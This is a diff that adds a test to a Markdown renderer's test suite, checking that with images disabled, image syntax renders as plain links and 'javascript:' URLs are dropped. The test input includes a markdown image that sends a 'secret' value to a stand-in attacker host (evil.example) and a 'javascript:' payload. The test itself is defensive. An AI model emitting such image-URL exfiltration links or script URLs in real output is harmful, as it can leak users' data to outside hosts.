@@ -88,6 +88,15 @@ describe("images", () => {
   it("links an image that sits inside a sentence", () => {
     expect(html("See ![the chart](https://x.y/c.png) here")).toContain('<a href="https://x.y/c.png"')
   })
+
+  it("with images={false} loads nothing: image lines become links", () => {
+    const out = renderToStaticMarkup(
+      createElement(Markdown, { source: "![leak](https://evil.example/?d=secret)\n![b](javascript:x)", images: false }),
+    )
+    expect(out).not.toContain("<img")
+    expect(out).toContain('<a href="https://evil.example/?d=secret"')
+    expect(out).not.toContain("javascript:")
+  })
 })
 
 describe("outline", () => {
